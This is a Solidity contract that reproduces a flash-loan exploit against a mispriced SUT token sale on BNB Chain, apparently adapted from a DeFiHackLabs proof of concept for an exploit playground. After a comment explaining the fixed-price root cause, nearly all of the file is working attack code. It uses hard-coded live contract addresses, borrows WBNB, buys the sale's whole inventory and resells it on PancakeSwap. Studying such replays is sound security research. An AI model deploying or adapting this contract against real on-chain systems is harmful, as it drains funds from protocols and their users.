// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-SUT).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `SUTTest`
// harness — the flash-loan callback `DPPFlashLoanCall` lives on the test
// contract itself (`assetTo = address(this)`), and profit (WBNB) simply
// accumulates in the test contract's own balance: there is no forwarding
// step and no standalone attack contract to deploy. This file is a
// faithful, self-contained copy of that inline attack (testExploit body +
// DPPFlashLoanCall callback + SUTToWBNB helper + minimal inline interfaces
// — no imports so it compiles anywhere), compiled inside the registry
// forge project. Logic and constants are copied verbatim from
// test/SUT_exp.sol.
//
// Root cause: SUTTokenSale sells its SUT inventory at a single, admin-set,
// hard-coded `tokenPrice` with no oracle/market check, no per-buyer cap,
// and a permissionless buyTokens() — while SUT trades freely on a
// PancakeSwap V3 pool at ~5.7x that price. Anyone can buy the entire
// inventory at the stale price and immediately resell it on the AMM for a
// risk-free profit. A secondary bug (integer-division truncation in the
// cost formula) makes the underpricing slightly worse.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function transfer(address dst, uint256 wad) external returns (bool);
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

interface ISUTTokenSale {
    function tokenPrice() external view returns (uint256);
    function buyTokens(uint256 _numberOfTokens) external payable;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract SUTDrain {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant SUT = IERC20(0x70E1bc7E53EAa96B74Fad1696C29459829509bE2);
    IUniswapV3Router constant ROUTER = IUniswapV3Router(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    IDPPOracle constant DPP_ORACLE = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    ISUTTokenSale constant SALE = ISUTTokenSale(0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37);

    // step 1: flash-borrow 10 WBNB from the DODO DPPOracle pool. The
    // callback below drains the mispriced sale and repays the loan.
    function run() external {
        DPP_ORACLE.flashLoan(10e18, 0, address(this), new bytes(1));
    }

    // DODO DPP flash-loan callback. Buys the WHOLE SUT inventory at the
    // stale, admin-set fixed price, dumps it on PancakeSwap V3 for the real
    // market price, and repays the loan out of the proceeds.
    function DPPFlashLoanCall(
        address, // sender
        uint256 baseAmount, // the 10e18 WBNB borrowed
        uint256, // quoteAmount
        bytes calldata // data
    ) external {
        SUT.approve(address(ROUTER), type(uint256).max);
        WBNB.withdraw(10e18);

        // Buy the ENTIRE sale inventory at the stale, admin-set fixed
        // price — the bug: tokenPrice never tracks the market.
        SALE.buyTokens{value: 6.855184233076263744 ether}(SUT.balanceOf(address(SALE)));

        // Sell all the acquired SUT into the real PancakeSwap V3 market.
        _sellSUT();

        // Wrap whatever native BNB is left over (10 - 6.855...) back to WBNB.
        WBNB.deposit{value: address(this).balance}();

        // Repay the flash loan.
        WBNB.transfer(address(DPP_ORACLE), baseAmount);
    }

    receive() external payable {}

    function _sellSUT() internal {
        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: address(SUT),
            tokenOut: address(WBNB),
            fee: 2500,
            recipient: address(this),
            amountIn: SUT.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        ROUTER.exactInputSingle(params);
    }
}
